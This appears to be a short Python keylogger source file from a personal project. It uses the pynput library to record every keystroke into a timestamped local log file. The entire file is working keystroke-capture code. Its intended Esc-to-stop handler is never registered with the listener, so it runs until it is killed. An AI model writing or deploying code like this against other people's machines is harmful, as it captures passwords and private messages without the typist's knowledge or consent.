from pynput import keyboard
import os
import time

a = open(f"D:/Projects/Keylogger/logs/log_{int(time.time())}.txt", "a", encoding='utf-8')

def on_press(key):

    try:
        a.write(f'{key.char} ')
    except AttributeError:
        a.write(f'[{key}] ')
    a.flush()

def on_release(key):
    if key == keyboard.Key.esc:
        a.close()
        return False
    
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()